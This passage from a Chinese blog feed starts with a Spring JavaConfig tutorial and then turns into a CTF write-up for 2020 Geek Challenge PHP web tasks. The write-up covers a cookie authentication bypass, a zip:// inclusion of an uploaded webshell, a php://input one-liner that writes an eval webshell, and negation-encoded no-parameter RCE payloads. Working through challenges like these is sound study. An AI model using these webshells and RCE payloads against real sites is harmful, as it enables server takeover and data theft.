<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="meta">@Component(&quot;com.ys.pojo&quot;)</span></span><br><span class="line"><span class="meta">@Import(JavaConfig2.class)</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JavaConfig</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> User <span class="title">user</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> User();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们使用@Configuration的意思等同于：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">beans</span> &gt;</span><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>之后我们所有的配置都可以写在该类当中</p>
<p>@Component(“com.ys.pojo”)类等同于如下代码：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">context:component-scan</span> <span class="attr">base-package</span>=<span class="string">&quot;com.ys&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure>

<p>将两者之间进行进一步的对比，如果我们想要配置一个类的话：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;user&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.ys.pojo.User&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure>

<p>这个XML标签等同于：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Bean</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> User <span class="title">user</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> User();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>那如何注入值呢？</p>
<p>在XML当中我们是这样操作的：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;user&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.ys.pojo.User&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;name&quot;</span> <span class="attr">value</span>=<span class="string">&quot;月石&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>而到了Javaconfig之中：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Value(&quot;月石&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String name;</span><br></pre></td></tr></table></figure>

<p>我们选择直接由类来注入值！</p>
<p>而Autowired依然没有变化，还是直接在包中寻找上下文的类~，比如我们尝试继续学习举例，一个人有一只猫和一个狗:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Cat</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">shout</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;🐱说：wdnmdb&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Dog</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">shout</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;🐕说：wndmd&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>当我们使用这种方式来创建之后，就没有地方来使用@Component这个注解了，因为我们没有XML呢？</p>
<p>总而言之我必须与做出这样的JavaConfig代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="meta">@Component(&quot;com.ys.pojo&quot;)</span></span><br><span class="line"><span class="meta">@Import(JavaConfig2.class)</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JavaConfig</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> User <span class="title">user</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> User();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Cat <span class="title">cat</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> Cat();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Dog <span class="title">dog</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> Dog();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>而我们的@Component就没有什么用武之地了..</p>
]]></content>
      <tags>
        <tag>开发</tag>
      </tags>
  </entry>
  <entry>
    <title>2020极客大挑战</title>
    <url>/2021/04/27/2020%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/</url>
    <content><![CDATA[<h2 id="Roamphp2-Myblog"><a href="#Roamphp2-Myblog" class="headerlink" title="Roamphp2-Myblog"></a>Roamphp2-Myblog</h2><p>先是伪协议到处读文件..</p>
<p>分别能读到home.php,login.php,secret.php，然后在login.php下看html能读到/admin/user.php</p>
<p>感觉像是伪随机数爆破..</p>
<p><img src="2020%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/image-20210427135216661.png" alt="image-20210427135216661"></p>
<p>审计代码后发现其实是可以绕过的，因为判断中对$_SESSIONpassword进行了对比，如果想要绕过的话将两者都是作为空即可</p>
<p>故我们直接构造payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cookies:</span><br><span class="line"></span><br><span class="line">username&#x3D;Longlone&amp;password&#x3D;</span><br></pre></td></tr></table></figure>

<p>登陆上之后就可以找到上传点，给出了源码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">       <span class="keyword">if</span>(<span class="keyword">isset</span>($_FILES[<span class="string">&#x27;Files&#x27;</span>]) <span class="keyword">and</span> $_SESSION[<span class="string">&#x27;status&#x27;</span>] === <span class="literal">true</span>)&#123;</span><br><span class="line">           $tmp_file = $_FILES[<span class="string">&#x27;Files&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">           $tmp_path = $_FILES[<span class="string">&#x27;Files&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">           <span class="keyword">if</span>(($extension = pathinfo($tmp_file)[<span class="string">&#x27;extension&#x27;</span>]) != <span class="string">&quot;&quot;</span>)&#123;</span><br><span class="line">               $allows = <span class="keyword">array</span>(<span class="string">&#x27;gif&#x27;</span>,<span class="string">&#x27;jpeg&#x27;</span>,<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;png&#x27;</span>);</span><br><span class="line">               <span class="keyword">if</span>(in_array($extension,$allows,<span class="literal">true</span>) <span class="keyword">and</span> in_array($_FILES[<span class="string">&#x27;Files&#x27;</span>][<span class="string">&#x27;type&#x27;</span>],array_map(<span class="function"><span class="keyword">function</span>(<span class="params">$ext</span>)</span>&#123;<span class="keyword">return</span> <span class="string">&#x27;image/&#x27;</span>.$ext;&#125;,$allows),<span class="literal">true</span>))&#123;</span><br><span class="line">                   $upload_name = sha1(md5(uniqid(microtime(<span class="literal">true</span>), <span class="literal">true</span>))).<span class="string">&#x27;.&#x27;</span>.$extension;</span><br><span class="line">                   move_uploaded_file($tmp_path,<span class="string">&quot;assets/img/upload/&quot;</span>.$upload_name);</span><br><span class="line">                   <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;Update image -&gt; assets/img/upload/$&#123;upload_name&#125;&#x27;) &lt;/script&gt;&quot;</span>;</span><br><span class="line">               &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                   <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;Update illegal! Only allows like \&#x27;gif\&#x27;, \&#x27;jpeg\&#x27;, \&#x27;jpg\&#x27;, \&#x27;png\&#x27; &#x27;) &lt;/script&gt;&quot;</span>;</span><br><span class="line">               &#125;</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>上传之后我们再去index.php包含不就好了吗！。想到这里我们马上操作.结果突然想到在文件的最后会被加上php后缀名,这就没办法直接读取了,只能通过zip协议</p>
<p>伪协议: file://、php://filter、php://input、zip://、compress.bzip2://、compress.zlib://、data://</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.freebuf.com&#x2F;column&#x2F;148886.html</span><br></pre></td></tr></table></figure>

<p><img src="2020%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/image-20210427143558838.png" alt="image-20210427143558838"></p>
<p>题外话:</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/cmd.php?file=php://input</span><br><span class="line"></span><br><span class="line">[POST DATA] &lt;?php phpinfo()?&gt;</span><br><span class="line"></span><br><span class="line">也可以POST如下内容生成一句话： &lt;?php fputs(fopen(&quot;shell.php&quot;,&quot;w&quot;),&#x27;&lt;?php eval($_POST[&quot;cmd&quot;];?&gt;&#x27;);?&gt;</span><br></pre></td></tr></table></figure>

<p>那么这样就简单了，写一个shell.php，然后压缩，再改后缀为jpg即可,</p>
<p><img src="2020%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/image-20210427144441817.png" alt="image-20210427144441817"></p>
<p>payload：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;0dad2d9e-f7fb-4cb0-905a-9860648d77ec.node3.buuoj.cn&#x2F;?page&#x3D;zip:&#x2F;&#x2F;&#x2F;var&#x2F;www&#x2F;html&#x2F;assets&#x2F;img&#x2F;upload&#x2F;d03ea7c190280b2369947674c89fb32c6e98f591.jpg%23shell</span><br></pre></td></tr></table></figure>

<h2 id="Roamphp4-Rceme"><a href="#Roamphp4-Rceme" class="headerlink" title="Roamphp4-Rceme"></a>Roamphp4-Rceme</h2><p>文件泄露..<br>swp的文件泄露是通过 .filename.swp的，比如：</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">index.php</span><br><span class="line">.index.php.swp</span><br></pre></td></tr></table></figure>

<p>脱下来之后得到源码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**********************************</span></span><br><span class="line"><span class="comment">*</span></span><br><span class="line"><span class="comment">* 	author : Longlone</span></span><br><span class="line"><span class="comment">* 	 type  : Backup</span></span><br><span class="line"><span class="comment">*</span></span><br><span class="line"><span class="comment">**********************************/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_SESSION[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line">    $_SESSION[<span class="string">&#x27;code&#x27;</span>] = substr(md5(mt_rand().sha1(mt_rand)),<span class="number">0</span>,<span class="number">5</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;cmd&#x27;</span>]) <span class="keyword">and</span> <span class="keyword">isset</span>($_POST[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(substr(md5($_POST[<span class="string">&#x27;code&#x27;</span>]),<span class="number">0</span>,<span class="number">5</span>) !== $_SESSION[<span class="string">&#x27;code&#x27;</span>])&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;&lt;script&gt;alert(\&#x27;Captcha error~\&#x27;);history.back()&lt;/script&gt;&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $_SESSION[<span class="string">&#x27;code&#x27;</span>] = substr(md5(mt_rand().sha1(mt_rand)),<span class="number">0</span>,<span class="number">5</span>);</span><br><span class="line">    $code = $_POST[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(strlen($code) &gt; <span class="number">70</span> <span class="keyword">or</span> preg_match(<span class="string">&#x27;/[A-Za-z0-9]|\&#x27;|&quot;|`|\ |,|\.|-|\+|=|\/|\\|&lt;|&gt;|\$|\?|\^|&amp;|\|/ixm&#x27;</span>,$code))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;&lt;script&gt;alert(\&#x27;Longlone not like you~\&#x27;);history.back()&lt;/script&gt;&#x27;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="string">&#x27;;&#x27;</span> === preg_replace(<span class="string">&#x27;/[^\s\(\)]+?\((?R)?\)/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, $code))&#123;</span><br><span class="line">        @<span class="keyword">eval</span>($code);</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>code我们可以通过爆破来得到：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (substr(md5($a), <span class="number">0</span>, <span class="number">5</span>) == <span class="string">&quot;f815a&quot;</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>($a.<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        $a++;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>六位数以下都可以爆破..超过六位数的话会很难出</p>
<p>这里再贴上一个别的师傅的python的：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> multiprocessing.dummy <span class="keyword">import</span> Pool <span class="keyword">as</span> ThreadPool</span><br><span class="line"></span><br><span class="line"><span class="comment"># MD5截断数值已知 求原始数据</span></span><br><span class="line"><span class="comment"># 例子 substr(md5(captcha), 0, 6)=60b7ef</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">md5</span>(<span class="params">s</span>):</span>    <span class="comment"># 计算MD5字符串</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(<span class="built_in">str</span>(s).encode(<span class="string">&#x27;utf-8&#x27;</span>)).hexdigest()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">keymd5 = <span class="string">&#x27;2e2f0&#x27;</span>    <span class="comment"># 已知的md5截断值</span></span><br><span class="line">md5start = <span class="number">0</span>    <span class="comment"># 设置题目已知的截断位置</span></span><br><span class="line">md5length = <span class="number">5</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">findmd5</span>(<span class="params">sss</span>):</span>    <span class="comment"># 输入范围 里面会进行md5测试</span></span><br><span class="line">    key = sss.split(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">    start = <span class="built_in">int</span>(key[<span class="number">0</span>])    <span class="comment"># 开始位置</span></span><br><span class="line">    end = <span class="built_in">int</span>(key[<span class="number">1</span>])    <span class="comment"># 结束位置</span></span><br><span class="line">    result = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(start, end):</span><br><span class="line">        <span class="comment"># print(md5(i)[md5start:md5length])</span></span><br><span class="line">        <span class="keyword">if</span> md5(i)[<span class="number">0</span>:<span class="number">5</span>] == keymd5:    <span class="comment"># 拿到加密字符串</span></span><br><span class="line">            result = i</span><br><span class="line">            print(result)    <span class="comment"># 打印</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">list</span>=[]    <span class="comment"># 参数列表</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):    <span class="comment"># 多线程的数字列表 开始与结尾</span></span><br><span class="line">    <span class="built_in">list</span>.append(<span class="built_in">str</span>(<span class="number">10000000</span>*i) + <span class="string">&#x27;:&#x27;</span> + <span class="built_in">str</span>(<span class="number">10000000</span>*(i+<span class="number">1</span>)))</span><br><span class="line">pool = ThreadPool()    <span class="comment"># 多线程任务</span></span><br><span class="line">pool.<span class="built_in">map</span>(findmd5, <span class="built_in">list</span>)    <span class="comment"># 函数与参数列表</span></span><br><span class="line">pool.close()</span><br><span class="line">pool.join()</span><br></pre></td></tr></table></figure>

<p>（顺便php的性能跑得比python快很多啊</p>
<p>异或这题挣不出来，思路不是这个，但是依然贴个异或脚本过来：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__file__</span>);</span><br><span class="line">$a = <span class="string">&#x27;~!@#$%^&amp;*()_+\|/?.,&lt;&gt;`-=&#123;&#125;[]&#x27;</span>;</span><br><span class="line"><span class="keyword">for</span>($i = <span class="number">0</span>;$i&lt;strlen($a);$i++)&#123;</span><br><span class="line">    <span class="keyword">for</span>($j = <span class="number">0</span>;$j&lt;strlen($a);$j++)&#123;</span><br><span class="line">        <span class="keyword">if</span> (ord($a[$i]^$a[$j])&gt;<span class="number">64</span> &amp;&amp; ord($a[$i]^$a[$j])&lt;<span class="number">91</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span>     $a[$i]. <span class="string">&#x27; xor &#x27;</span> .$a[$j]. <span class="string">&#x27; is &#x27;</span>;</span><br><span class="line">            <span class="keyword">echo</span>  chr(ord($a[$i]^$a[$j])). <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">            <span class="keyword">echo</span>  ord($a[$i]^$a[$j]);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;\n&lt;br&gt;&quot;</span>;</span><br><span class="line">        &#125;<span class="keyword">elseif</span> (ord($a[$i]^$a[$j])&gt;<span class="number">96</span> &amp;&amp; ord($a[$i]^$a[$j])&lt;<span class="number">122</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span>     $a[$i]. <span class="string">&#x27; xor &#x27;</span> .$a[$j]. <span class="string">&#x27; is &#x27;</span>;</span><br><span class="line">            <span class="keyword">echo</span>   chr(ord($a[$i]^$a[$j])). <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">            <span class="keyword">echo</span>    <span class="string">&#x27;  &#x27;</span> .ord($a[$i]^$a[$j]);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">vaild = <span class="string">&quot;!@&amp;%^*()&#123;&#125;[];\&#x27;\&quot;,.&lt;&gt;?-=_`~&quot;</span></span><br><span class="line"></span><br><span class="line">answer =<span class="string">&quot;phpinfo&quot;</span></span><br><span class="line">tmp,tmp2 = <span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> answer:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> vaild:</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> vaild:</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">ord</span>(i)^<span class="built_in">ord</span>(j) ==<span class="built_in">ord</span>(c):</span><br><span class="line">                tmp+=j</span><br><span class="line">                tmp+=i</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">print(tmp,tmp2)</span><br></pre></td></tr></table></figure>

<p>回到题目，这里需要一个trick，取反的时候其实可以用</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">[~取反值][!%FF]</span><br></pre></td></tr></table></figure>

<p>这样来构造..我们先试试看执行phpinfo();</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">cmd=[~%8F%97%8F%96%91%99%90][!%FF]();&amp;code=653808</span><br></pre></td></tr></table></figure>

<p><img src="2020%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/image-20210427170155926.png" alt="image-20210427170155926"></p>
<p>发现成功执行。【顺便踩坑，不能用postman去做，自己在这里卡了好久 = = 卧槽</p>
<p>再之后尝试配合着打无参数RCE</p>
<p>膜王叹之师傅【</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.cnblogs.com&#x2F;wangtanzhi&#x2F;p&#x2F;12311239.html</span><br></pre></td></tr></table></figure>

<p>收集知识：</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">current(localeconv());</span><br><span class="line">pos(localeconv())</span><br></pre></td></tr></table></figure>

<p>就是两个点，所以我们可以用这两个扫目录：</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">print_r(scandir(current(localeconv())))</span><br></pre></td></tr></table></figure>

<p>取反一波：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//$a = &quot;%8C%86%8C%8B%9A%92&quot;;</span></span><br><span class="line"><span class="comment">//echo (~urldecode($a));</span></span><br><span class="line">$b = <span class="string">&quot;localeconv&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> urlencode((~$b));</span><br><span class="line"><span class="comment">//print_r(scandir(pos(localeconv())))</span></span><br><span class="line"><span class="comment">//var_dump =%89%9E%8D%A0%9B%8A%92%8F</span></span><br><span class="line"><span class="comment">//getallheaders =%98%9A%8B%9E%93%93%97%9A%9E%9B%9A%8D%8C</span></span><br><span class="line"><span class="comment">//[~%89%9E%8D%A0%9B%8A%92%8F][!%FF]([~%98%9A%8B%9E%93%93%97%9A%9E%9B%9A%8D%8C][!%FF]());</span></span><br><span class="line"><span class="comment">//phpinfo [~%8F%97%8F%96%91%99%90][!%FF]();</span></span><br><span class="line"><span class="comment">//print_r %8F%8D%96%91%8B%A0%8D</span></span><br><span class="line"><span class="comment">//scandir %8C%9C%9E%91%9B%96%8D</span></span><br><span class="line"><span class="comment">//current %9C%8A%8D%8D%9A%91%8B</span></span><br><span class="line"><span class="comment">//pos %8F%90%8C</span></span><br><span class="line"><span class="comment">//localeconv %93%90%9C%9E%93%9A%9C%90%91%89</span></span><br><span class="line"><span class="comment">//拼起来：[~%8F%8D%96%91%8B%A0%8D][!%FF]([~%8C%9C%9E%91%9B%96%8D][!%FF]([~%8F%90%8C][!%FF]([~%93%90%9C%9E%93%9A%9C%90%91%89][!%FF]())));</span></span><br></pre></td></tr></table></figure>

<p>得出：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">cmd=[~%<span class="number">8</span>F%<span class="number">8</span>D%<span class="number">96</span>%<span class="number">91</span>%<span class="number">8</span>B%A0%<span class="number">8</span>D][!%FF]([~%<span class="number">8</span>C%<span class="number">9</span>C%<span class="number">9</span>E%<span class="number">91</span>%<span class="number">9</span>B%<span class="number">96</span>%<span class="number">8</span>D][!%FF]([~%<span class="number">8</span>F%<span class="number">90</span>%<span class="number">8</span>C][!%FF]([~%<span class="number">93</span>%<span class="number">90</span>%<span class="number">9</span>C%<span class="number">9</span>E%<span class="number">93</span>%<span class="number">9</span>A%<span class="number">9</span>C%<span class="number">90</span>%<span class="number">91</span>%<span class="number">89</span>][!%FF]())));&amp;code=<span class="number">217941</span></span><br></pre></td></tr></table></figure>



<p><img src="2020%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/image-20210427180311201.png" alt="image-20210427180311201"></p>
<p>结果flag不在这里，wdnmd。如果一直跟到根目录的话实在太恶心太长了。</p>
<p>转换一下思路好了：</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">system(hex2bin(session_id(session_start()));</span><br></pre></td></tr></table></figure>

<p>现在可以了</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">[~%<span class="number">8</span>C%<span class="number">86</span>%<span class="number">8</span>C%<span class="number">8</span>B%<span class="number">9</span>A%<span class="number">92</span>][!%FF]([~%<span class="number">97</span>%<span class="number">9</span>A%<span class="number">87</span>%CD%<span class="number">9</span>D%<span class="number">96</span>%<span class="number">91</span>][!%FF]([~%<span class="number">8</span>C%<span class="number">9</span>A%<span class="number">8</span>C%<span class="number">8</span>C%<span class="number">96</span>%<span class="number">90</span>%<span class="number">91</span>%A0%<span class="number">96</span>%<span class="number">9</span>B][!%FF]([~%<span class="number">8</span>C%<span class="number">9</span>A%<span class="number">8</span>C%<span class="number">8</span>C%<span class="number">96</span>%<span class="number">90</span>%<span class="number">91</span>%A0%<span class="number">8</span>C%<span class="number">8</span>B%<span class="number">9</span>E%<span class="number">8</span>D%<span class="number">8</span>B][!%FF]())));</span><br></pre></td></tr></table></figure>

<p>但是在这种思路下的话，因为拥有空格，就会导致每次的验证码都不停的在变就很烦，所以我们每次都会遭遇验证码错误。。没办法用空格的话再用${IFS}$9试试看</p>
<p><img src="2020%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/image-20210427201800222.png" alt="image-20210427201800222"></p>
<p>结果依然出不来。。很烦，不知道为什么，MD，。大概是cookies不允许，想了想整个别的活</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">eval</span>(session_id(session_start()));</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">[~%<span class="number">9</span>A%<span class="number">89</span>%<span class="number">9</span>E%<span class="number">93</span>][!%FF]([~%<span class="number">8</span>C%<span class="number">9</span>A%<span class="number">8</span>C%<span class="number">8</span>C%<span class="number">96</span>%<span class="number">90</span>%<span class="number">91</span>%A0%<span class="number">96</span>%<span class="number">9</span>B][!%FF]([~%<span class="number">8</span>C%<span class="number">9</span>A%<span class="number">8</span>C%<span class="number">8</span>C%<span class="number">96</span>%<span class="number">90</span>%<span class="number">91</span>%A0%<span class="number">8</span>C%<span class="number">8</span>B%<span class="number">9</span>E%<span class="number">8</span>D%<span class="number">8</span>B][!%FF]()));</span><br></pre></td></tr></table></figure>

<p>结果想法依然没办法成功，cookies只要携带特殊符号就会验证码不通过，这下就恶心到我了。</p>
<p>翻出别人的总结:</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">getchwd() 函数返回当前工作目录。</span><br><span class="line">scandir() 函数返回指定目录中的文件和目录的数组。</span><br><span class="line">dirname() 函数返回路径中的目录部分。</span><br><span class="line">chdir() 函数改变当前的目录。</span><br><span class="line"></span><br><span class="line">readfile()  输出一个文件</span><br><span class="line"></span><br><span class="line">current()       返回数组中的当前单元, 默认取第一个值</span><br><span class="line">pos()           current() 的别名</span><br><span class="line">next() 函数将内部指针指向数组中的下一个元素，并输出。</span><br><span class="line">end()       将内部指针指向数组中的最后一个元素，并输出。</span><br><span class="line">array_rand()    函数返回数组中的随机键名，或者如果您规定函数返回不只一个键名，则返回包含随机键名的数组。</span><br><span class="line">array_flip()    array_flip() 函数用于反转/交换数组中所有的键名以及它们关联的键值。</span><br><span class="line">array_slice() 函数在数组中根据条件取出一段值，并返回</span><br><span class="line">chr() 函数从指定的 ASCII 值返回字符。</span><br><span class="line">hex2bin — 转换十六进制字符串为二进制字符串</span><br><span class="line"></span><br><span class="line">getenv()        获取一个环境变量的值(在7.1之后可以不给予参数)</span><br></pre></td></tr></table></figure>

<p>那么我们来构建</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">system(current(getallheaders()));</span><br></pre></td></tr></table></figure>

